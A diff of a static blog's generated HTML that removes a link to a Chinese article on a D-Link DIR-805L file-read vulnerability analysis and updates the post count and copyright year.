-<li><a target="_blank" rel="noopener" href="https://f5.pm/go-4502.html">https://f5.pm/go-4502.html</a></li>
-<li>[路由器漏洞挖掘之 DIR-805L 越权文件读取漏洞分析](路由器漏洞挖掘之 DIR-805L 越权文件读取漏洞分析)</li>
-</ul>
-
-      
-    </div>
-
-    
-    
-    
-      <footer class="post-footer">
-        <div class="post-eof"></div>
-      </footer>
-  </article>
-  
-  
-  
-
 
   
   <nav class="pagination">
@@ -1647,7 +1578,7 @@
       <div class="site-state-item site-state-posts">
           <a href="/archives/">
         
-          <span class="site-state-item-count">68</span>
+          <span class="site-state-item-count">70</span>
           <span class="site-state-item-name">posts</span>
         </a>
       </div>
@@ -1687,7 +1618,7 @@
 <div class="copyright">
   
   &copy; 
-  <span itemprop="copyrightYear">2023</span>
+  <span itemprop="copyrightYear">2024</span>
   <span class="with-love">
     <i class="fa fa-heart"></i>
   </span>
